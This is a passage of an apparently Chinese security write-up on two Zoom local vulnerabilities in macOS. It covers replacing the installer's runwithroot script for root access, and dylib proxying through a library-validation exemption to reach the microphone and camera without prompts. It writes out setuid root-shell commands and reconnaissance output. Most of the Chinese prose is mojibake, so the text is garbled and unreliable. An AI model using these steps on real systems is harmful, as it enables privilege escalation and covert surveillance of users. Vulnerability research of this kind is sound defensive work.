        "ppid" : 1876,
        "ancestors" : [
          1876,
          1823,
          1820,
          1
        ],
        "signing info" : {
          "csFlags" : 603996161,
          "signatureIdentifier" : "com.apple.sh",
          "cdHash" : "D3308664AA7E12DF271DC78A7AE61F27ADA63BD6",
          "isPlatformBinary" : 1
        },
        "path" : "/bin/sh",
        "pid" : 1882
      },
      "timestamp" : "2020-03-31 03:18:45 +0000"
    }
runwithrootè„šæœ¬çš„å†…å®¹æ— å…³ç´§è¦ã€‚é‡è¦çš„æ˜¯ï¼Œæœ¬åœ°æ— ç‰¹æƒçš„æ”»å‡»è€…ï¼ˆæˆ–æ˜¯æ¶æ„è½¯ä»¶ç‰‡æ®µï¼‰å¯ä»¥åœ¨ä»¥rootç”¨æˆ·èº«ä»½æ‰§è¡Œè„šæœ¬ä¹‹å‰ä¿®æ”¹è¯¥è„šæœ¬å—ï¼Ÿï¼ˆå†æ¬¡æé†’ï¼ŒAuthorizationExecuteWithPrivileges
APIä¸ä¼šéªŒè¯æ­£åœ¨æ‰§è¡Œçš„å†…å®¹ï¼‰
ç­”æ¡ˆæ˜¯æ˜¾è€Œæ˜“è§çš„ï¼šæ˜¯å¯ä»¥ä¿®æ”¹çš„ã€‚
æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€ä¸ªäº‹å®æ¥ç¡®è®¤è¿™ä¸€ç‚¹ã€‚é‚£å°±æ˜¯åœ¨å®‰è£…è¿‡ç¨‹ä¸­æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°macOSå®‰è£…ç¨‹åºï¼ˆå¤„ç†.pkgsï¼‰ä¼šå°†runwithrootè„šæœ¬å¤åˆ¶åˆ°ç”¨æˆ·å¯å†™çš„ä¸´æ—¶ç›®å½•ä¸­ï¼š
    tester@users-Mac T % pwd      
    /private/var/folders/v5/s530008n11dbm2n2pgzxkk700000gp/T
    tester@users-Mac T % ls -lart com.apple.install.v43Mcm4r
    total 27224
    -rwxr-xr-x   1 tester  staff     70896 Mar 23 02:25 zoomAutenticationTool
    -rw-r--r--   1 tester  staff       513 Mar 23 02:25 zoom.entitlements
    -rw-r--r--   1 tester  staff  12008512 Mar 23 02:25 zm.7z
    -rwxr-xr-x   1 tester  staff       448 Mar 23 02:25 runwithroot
    ...
çœ‹ä¸Šå»æˆ‘ä»¬åº”è¯¥å¯ä»¥è·å–åˆ°rootæƒé™~
å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œåˆ©ç”¨è¿™ç§ç±»å‹çš„æ¼æ´è·å–æƒé™çš„åšæ³•æ˜¯ååˆ†å¯é çš„ï¼ˆå°½ç®¡éœ€è¦ä¸€äº›è€å¿ƒï¼Œå› ä¸ºæ‚¨å¿…é¡»ç­‰å¾…å®‰è£…ç¨‹åºæˆ–æ›´æ–°ç¨‹åºçš„è¿è¡Œï¼ï¼‰ï¼š  
ä¸ºäº†åˆ©ç”¨Zoomçš„è¿™ä¸€æ¼æ´ï¼Œæœ¬åœ°éç‰¹æƒæ”»å‡»è€…å¯ä»¥åœ¨å®‰è£…ï¼ˆæˆ–å‡çº§ï¼‰æœŸé—´ç®€å•åœ°æ›¿æ¢æˆ–ä¿®æ”¹runwithrootè„šæœ¬æ¥è·å¾—rootç”¨æˆ·è®¿é—®æƒé™ã€‚
ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥å‘runwithrootè„šæœ¬ä¸­æ·»åŠ ä»¥ä¸‹å‘½ä»¤æ¥å¼¹root shellï¼š
    1 cp /bin/ksh /tmp
    2 chown root:wheel /tmp/ksh
    3 chmod u+s /tmp/ksh
    4 open /tmp/ksh
æ•ˆæœå›¾å¦‚ä¸‹ï¼š  
## Zoomæœ¬åœ°å®‰å…¨æ¼æ´#2 è·å–éº¦å…‹é£ä¸æ‘„åƒå¤´æƒé™çš„ä»£ç æ³¨å…¥
Zoomè½¯ä»¶çš„ä½¿ç”¨æ¯‹åº¸ç½®ç–‘éœ€è¦ç³»ç»Ÿéº¦å…‹é£ä¸æ‘„åƒå¤´çš„æƒé™ã€‚
åœ¨æœ€æ–°ç‰ˆæœ¬çš„macOSä¸Šï¼Œè¿™ç§æƒé™çš„ç”³è¯·éœ€è¦æ˜ç¡®çš„ç”¨æˆ·æ‰¹å‡†ã€‚ï¼ˆä»å®‰å…¨ä¸éšç§çš„è§’åº¦æ¥çœ‹æ˜¯ä¸€ä»¶å¥½äº‹ï¼‰ï¼š  
ç„¶è€Œï¼ŒZoomå¯¹æ­¤å…·æœ‰ï¼ˆå‡ºäºæˆ‘æ‰€ä¸çŸ¥é“çš„åŸå› ï¼‰ç‰¹æ®Šçš„â€œæ’é™¤é¡¹â€ï¼Œè¯¥â€œæ’é™¤é¡¹â€å…è®¸æ”»å‡»è€…å°†æ¶æ„ä»£ç æ³¨å…¥å…¶è¿›ç¨‹ç©ºé—´ä¸­ï¼Œä½¿æ¶æ„ä»£ç æ‹¥æœ‰äº†Zoomçš„ï¼ˆéº¦å…‹é£å’Œæ‘„åƒå¤´ï¼‰è®¿é—®æƒé™ï¼è¿™ç»™æ”»å‡»è€…æä¾›äº†ä¸€ç§è®°å½•å—å®³è€…Zoomä¼šè®®çš„æ–¹æ³•ï¼Œæ›´ç³Ÿç³•çš„æ˜¯ï¼Œå®ƒç”šè‡³å¯ä»¥åœ¨ä»»æ„æ—¶é—´ï¼ˆæ²¡æœ‰ç”¨æˆ·è®¿é—®æç¤ºï¼‰è®¿é—®éº¦å…‹é£å’Œæ‘„åƒå¤´ï¼
ç°ä»£macOSç¨‹åºåœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­å¼•å…¥äº†ä¸€ä¸ªå«åš[Hardened
Runtime](https://developer.apple.com/documentation/security/hardened_runtime)çš„ç‰¹æ€§ã€‚Appleå®˜æ–¹å¯¹è¿™ä¸€å¢å¼ºå®‰å…¨çš„ç‰¹æ€§æè¿°å¦‚ä¸‹ï¼š
_Hardened Runtime_ ä¸ç³»ç»Ÿå®Œæ•´æ€§ä¿æŠ¤(System Integrity Protection,
SIP)ä¸€èµ·ï¼Œé€šè¿‡é˜²æ­¢æŸäº›ç±»å‹çš„æ¼æ´(å¦‚ä»£ç æ³¨å…¥ã€åŠ¨æ€é“¾æ¥åº“(DLL)åŠ«æŒå’Œè¿›ç¨‹å†…å­˜ç©ºé—´ç¯¡æ”¹)æ¥ä¿æŠ¤è½¯ä»¶è¿è¡Œæ—¶çš„å®Œæ•´æ€§ã€‚
è‹¹æœå…¬å¸å‚åŠ äº†2016å¹´åœ¨è«æ–¯ç§‘ä¸¾è¡Œçš„[ZeroNights](https://twitter.com/ZeroNights)å¤§ä¼šï¼Œæˆ‘åœ¨ä¼šè®®ä¸Šæ³¨æ„åˆ°è¯¥åŠŸèƒ½å°†å¯¹macOSçš„å®‰å…¨èµ·åˆ°å¾ˆå¤§ä½œç”¨ï¼š  
æˆ‘ä»¬å¯ä»¥é€šè¿‡codesignå·¥å…·æ£€æŸ¥Zoomï¼ˆæˆ–å…¶ä»–ä»»ä½•åº”ç”¨ç¨‹åºï¼‰æ˜¯å¦å·²ä½¿ç”¨â€œ Hardened Runtimeâ€è¿›è¡Œæœ‰æ•ˆç­¾åå’Œç¼–è¯‘ã€‚
    $ codesign -dvvv /Applications/zoom.us.app/
    Executable=/Applications/zoom.us.app/Contents/MacOS/zoom.us
    Identifier=us.zoom.xos
    Format=app bundle with Mach-O thin (x86_64)
    CodeDirectory v=20500 size=663 flags=0x10000(runtime) hashes=12+5 location=embedded
    ...
    Authority=Developer ID Application: Zoom Video Communications, Inc. (BJ4HAAB9B3)
    Authority=Developer ID Certification Authority
    Authority=Apple Root CA
flagså€¼ä¸º0x10000ï¼ˆruntimeï¼‰è¡¨ç¤ºåº”ç”¨ç¨‹åºæ˜¯ä½¿ç”¨â€œ Hardened
Runtimeâ€é€‰é¡¹ç¼–è¯‘çš„ã€‚å› æ­¤ï¼Œè¿è¡Œæ—¶åº”ç”±macOSå¯¹æ­¤åº”ç”¨ç¨‹åºå¼ºåˆ¶æ‰§è¡Œã€‚
åˆ°ç›®å‰ä¸ºæ­¢éƒ½å¾ˆå¥½ï¼æ­£ç¡®åœ°å®æ–½Hardened Runtimeä¼šé˜»æ­¢ä»£ç æ³¨å…¥ç­‰è¿™ä¸€ç±»å‹çš„æ”»å‡»ã€‚
ç„¶è€Œï¼Œæˆ‘ç»ˆç©¶è¿˜æ˜¯å‘ç°äº†Zoomåœ¨å®ç°è¿™ä¸€ç‰¹æ€§ä¸Šçš„é—®é¢˜ğŸ˜…ã€‚
æˆ‘ä»¬å†æ¬¡é€šè¿‡codesignå·¥å…·dumpå‡ºZoomçš„entitlementsï¼ˆentitlementsæ˜¯ä»£ç ç­¾ååçš„åŠŸèƒ½æˆ–å¼‚å¸¸ï¼‰ã€‚
    codesign -d --entitlements :- /Applications/zoom.us.app/
    Executable=/Applications/zoom.us.app/Contents/MacOS/zoom.us
      com.apple.security.automation.apple-events
      com.apple.security.device.audio-input
      com.apple.security.device.camera
      com.apple.security.cs.disable-library-validation
      com.apple.security.cs.disable-executable-page-protection
ç”±äºZooméœ€è¦(ç”¨æˆ·æ‰¹å‡†çš„)éº¦å…‹é£å’Œæ‘„åƒå¤´è®¿é—®æƒé™ï¼Œå› æ­¤éœ€è¦com.apple.security.device.audio-inputå’Œcom.apple.security.device.cameraè¿™ä¿©ä¸ªentitlements ã€‚
ç„¶è€Œcom.apple.security.cs.disable-library-validationè¿™ä¸€entitlementéå¸¸æœ‰è¶£ï¼Œç®€å•æ¥è¯´ï¼Œå®ƒçš„åŠŸèƒ½å°±æ˜¯å‘Šè¯‰macOSï¼Œæˆ‘æ—¢æƒ³è¦ _â€œHardened Runtimeâ€_
ï¼Œåˆæƒ³å…è®¸ä»»ä½•åº“åŠ è½½åˆ°æˆ‘çš„åœ°å€ç©ºé—´ä¸­ã€‚æ¢å¥è¯è¯´ä»£ç æ³¨å…¥æ˜¯å¯è¡Œçš„äº†ï¼
Appleå®˜æ–¹æœ‰å…³äºæ­¤entitlementçš„ä»‹ç»ï¼š  
å› æ­¤ï¼Œç”±äºè¿™ç§entitlementçš„å­˜åœ¨ï¼Œæˆ‘ä»¬(ç†è®ºä¸Š)å¯ä»¥ç»•è¿‡â€œHardened
Runtimeâ€ï¼Œå¹¶å°†æ¶æ„åº“ä»£ç æ³¨å…¥Zoomä¸­(ä¾‹å¦‚ï¼Œåœ¨æ²¡æœ‰è®¿é—®è­¦å‘Šçš„æƒ…å†µä¸‹è®¿é—®éº¦å…‹é£å’Œæ‘„åƒå¤´)ã€‚
æœ‰å¤šç§æ–¹æ³•å¯ä»¥å¼ºåˆ¶è¿œç¨‹è¿›ç¨‹åœ¨åŠ è½½æˆ–è¿è¡Œæ—¶åŠ è½½åŠ¨æ€åº“ã€‚è¿™é‡Œæˆ‘ä»¬å°†é‡ç‚¹ä»‹ç»ä¸€å«åš`dylib
proxying`çš„æ–¹æ³•ï¼Œè¿™ç§æ–¹æ³•æ—¢éšè”½åˆæŒä¹…ï¼Œæ·±å—æ¶æ„è½¯ä»¶ä½œè€…å–œçˆ±ã€‚
`dylib
proxying`ï¼Œç®€è€Œè¨€ä¹‹å°±æ˜¯æˆ‘ä»¬æ›¿æ¢äº†ç›®æ ‡ï¼ˆå³Zoomï¼‰æ‰€ä¾èµ–çš„åˆæ³•åº“æ–‡ä»¶ï¼Œç„¶åå°†Zoomå‘å‡ºçš„æ‰€æœ‰è¯·æ±‚ä»£ç†å›åŸå§‹åº“æ–‡ä»¶ï¼Œä»¥ç¡®ä¿ç¨‹åºåŠŸèƒ½æ­£å¸¸ä½¿ç”¨ã€‚
`dylib
proxying`çš„å¦ä¸€ä¸ªå¥½å¤„æ˜¯å®ƒä¸ä¼šæŸå®³äºŒè¿›åˆ¶æ–‡ä»¶çš„ä»£ç ç­¾åè¯ä¹¦ï¼ˆä½†æ˜¯ï¼Œå®ƒå¯èƒ½ä¼šå½±å“ç¨‹åºé›†çš„ç­¾åï¼‰ã€‚ä»è€ŒAppleåœ¨è¿è¡Œæ—¶è¿›è¡Œçš„ç­¾åæ£€æŸ¥(å¦‚å¯¹éº¦å…‹é£å’Œæ‘„åƒå¤´çš„è®¿é—®)ä¸ä¼šæ£€æµ‹åˆ°æ¶æ„åº“æ–‡ä»¶ï¼Œå› æ­¤ä»ç„¶å¯ä»¥ä¿æŒå¯¹éº¦å…‹é£å’Œæ‘„åƒå¤´çš„è®¿é—®æƒé™ã€‚
è¿™æ˜¯æˆ‘åœ¨æ¼æ´åˆ©ç”¨ä¸­ç»å¸¸ä½¿ç”¨çš„ä¸€ç§æ–¹æ³•ï¼Œä¾‹å¦‚ï¼ˆä»¥å‰ï¼‰ç»•è¿‡SIPï¼š  
å¦‚å›¾æ‰€ç¤ºï¼Œæ”»å‡»è€…å¯ä»¥ä»£ç†IASUtilitiesåº“ï¼Œè¿™æ ·macOSåŠ¨æ€é“¾æ¥å™¨(dyld)å°±ä¼šè‡ªåŠ¨å°†æ¶æ„ä»£ç åŠ è½½(â€œæ³¨å…¥â€)åˆ°Appleçš„å®‰è£…å™¨ä¸­(SIPç»•è¿‡æ”»å‡»çš„å…ˆå†³æ¡ä»¶)ã€‚
å›åˆ°Zoomçš„é—®é¢˜ä¸Šï¼Œæˆ‘ä»¬å°†ä»¥ç±»ä¼¼çš„æ–¹æ³•ä»£ç†ä¸€ä¸ªåº“(Zooméœ€è¦çš„)ï¼Œä½¿å¾—æ¶æ„åº“æ–‡ä»¶åœ¨å¯åŠ¨æ—¶å¯ä»¥è‡ªåŠ¨åŠ è½½åˆ°Zoomçš„å¯ä¿¡è¿›ç¨‹åœ°å€ç©ºé—´ã€‚
ä¸ºäº†ç¡®å®šZoomåœ¨è¿è¡Œæ—¶é“¾æ¥äº†å“ªäº›åº“ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡macOSåŠ¨æ€åŠ è½½ç¨‹åºè‡ªåŠ¨åŠ è½½Zoomï¼Œä¹‹åä½¿ç”¨otoolå·¥å…·é€šè¿‡Lå‚æ•°å°†å…¶æ˜¾ç¤ºå‡ºæ¥ï¼š
    $ otool -L /Applications/zoom.us.app/Contents/MacOS/zoom.us 
    /Applications/zoom.us.app/Contents/MacOS/zoom.us:
      @rpath/curl64.framework/Versions/A/curl64
      /System/Library/Frameworks/Cocoa.framework/Versions/A/Cocoa
      /System/Library/Frameworks/Foundation.framework/Versions/C/Foundation
      /usr/lib/libobjc.A.dylib
      /usr/lib/libc++.1.dylib
      /usr/lib/libSystem.B.dylib
      /System/Library/Frameworks/AppKit.framework/Versions/C/AppKit
      /System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation